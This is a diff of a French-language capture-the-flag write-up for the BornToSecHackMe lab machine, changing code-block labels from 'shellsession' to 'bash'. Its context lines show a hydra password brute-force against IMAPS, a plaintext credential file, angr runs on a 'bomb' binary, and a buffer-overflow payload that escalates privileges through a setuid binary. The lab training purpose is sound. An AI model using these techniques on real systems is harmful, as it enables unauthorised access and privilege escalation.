@@ -111,7 +111,7 @@ Faute de mieux on se rabat sur le webmail et on parvient à se conecter avec `la
 
 Il se peut que le webmail ait quelques réticences à vous connecter et c'est sans doute ce qui m'avait laissé un mauvais apperçu du CTF. Il semble qu'au pire on peut aussi accéder aux emails via le port imaps :
 
-```shellsession
+```bash
 $ hydra -L users.txt  -P pass.txt imaps://192.168.56.66
 Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -273,7 +273,7 @@ drwxr-x--- 4 zaz                  zaz                  147 Oct 15  2015 zaz
 
 Le dossier contient un fichier qui renferme des identifiants :
 
-```shellsession
+```bash
 www-data@BornToSecHackMe:/home/LOOKATME$ cat password
 lmezard:G!@M6f4Eatau{sF"
 ```
@@ -282,7 +282,7 @@ lmezard:G!@M6f4Eatau{sF"
 
 On peut alors changer d'utilisateur (via `su`) et découvrir de nouveaux fichiers :
 
-```shellsession
+```bash
 lmezard@BornToSecHackMe:~$ ls -al
 total 791
 dr-xr-x--- 2 lmezard  lmezard     61 Oct 15  2015 .
@@ -376,7 +376,7 @@ Now SHA-256 it and submit
 
 Comme indiqué dans le README on génère le hash sha256 :
 
-```shellsession
+```bash
 $ echo -n Iheartpwnage | sha256sum
 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4  -
 ```
@@ -387,7 +387,7 @@ Et on peut se connecter via SSH au compte `laurie`.
 
 On a une fois de plus deux fichiers présents :
 
-```shellsession
+```bash
 laurie@BornToSecHackMe:~$ ls -l
 total 27
 -rwxr-x--- 1 laurie laurie 26943 Oct  8  2015 bomb
@@ -564,7 +564,7 @@ Le problème vient certainement plus d'une mauvaise utilisation d'`angr` de ma p
 
 A la fin je fais afficher les valeurs attachées à mes entiers symboliques :
 
-```shellsession
+```bash
 $ python defuse.py
 WARNING  | 2022-11-28 23:26:45,295 | cle.backends.externs | Symbol was allocated without a known size; emulation may fail if it is used non-opaquely: __ctype_b
 WARNING  | 2022-11-28 23:26:45,297 | cle.loader     | For more information about "Symbol was allocated without a known size", see https://docs.angr.io/extending-angr/environment#simdata
@@ -609,7 +609,7 @@ Cette fois l'option passée à `find` n'est pas une chaine de caractère qui doi
 
 Exécution :
 
-```shellsession
+```bash
 $ python defuse.py
 WARNING  | 2022-11-28 23:42:23,130 | cle.backends.externs | Symbol was allocated without a known size; emulation may fail if it is used non-opaquely: __ctype_b
 WARNING  | 2022-11-28 23:42:23,132 | cle.loader     | For more information about "Symbol was allocated without a known size", see https://docs.angr.io/extending-angr/environment#simdata
@@ -773,7 +773,7 @@ Avant de lancer la recherche avec la fonction `explore` je spécifie sur l'état
 
 L'exécution est rapide :
 
-```shellsession
+```bash
 $ python defuse.py
 WARNING  | 2022-11-28 22:25:29,871 | cle.backends.externs | Symbol was allocated without a known size; emulation may fail if it is used non-opaquely: __ctype_b
 WARNING  | 2022-11-28 22:25:29,873 | cle.loader     | For more information about "Symbol was allocated without a known size", see https://docs.angr.io/extending-angr/environment#simdata
@@ -821,7 +821,7 @@ def solve_flag_6():
 
 Résultat :
 
-```shellsession
+```bash
 python defuse.py
 WARNING  | 2022-11-28 22:44:29,571 | cle.backends.externs | Symbol was allocated without a known size; emulation may fail if it is used non-opaquely: __ctype_b
 WARNING  | 2022-11-28 22:44:29,574 | cle.loader     | For more information about "Symbol was allocated without a known size", see https://docs.angr.io/extending-angr/environment#simdata
@@ -832,7 +832,7 @@ WARNING  | 2022-11-28 22:44:29,574 | cle.loader     | For more information about
 
 On final ça se passe comme ça :
 
-```shellsession
+```bash
 $ ./bomb
 Welcome this is my little bomb !!!! You have 6 stages with
 only one life good luck !! Have a nice day!
@@ -866,7 +866,7 @@ Quand on voit [les solutions pour le binaire du CMU](https://redpwn.net/writeups
 
 Une fois connecté avec l'utilisateur `thor` on remarque une fois de plus qu'il n'est pas membre de groupes intéressants et qu'il dispose de deux fichiers dans on home :
 
-```shellsession
+```bash
 thor@BornToSecHackMe:~$ cat README
 Finish this challenge and use the result as password for 'zaz' user.
 thor@BornToSecHackMe:~$ head -5 turtle
@@ -928,7 +928,7 @@ Cette fois ça y est, on est sur le boss final :
 
 On a donc ce binaire setuid, non strippé et qui ne semble rien faire de plus qu'un `strcpy` et un `puts`.
 
-```shellsession
+```bash
 zaz@BornToSecHackMe:~$ ./exploit_me toto
 toto
 zaz@BornToSecHackMe:~$ ./exploit_me totoooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo
@@ -1043,7 +1043,7 @@ int main(void) {
 
 J'ajoute le dossier courant dans le path et on exploite :
 
-```shellsession
+```bash
 zaz@BornToSecHackMe:~$ export PATH=.:$PATH
 zaz@BornToSecHackMe:~$ ./exploit_me `python -c 'print "A"*140 + "\x60\xb0\xe6\xb7\x28\x90\x04\x08\x28\x90\x04\x08"'`
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`���((�
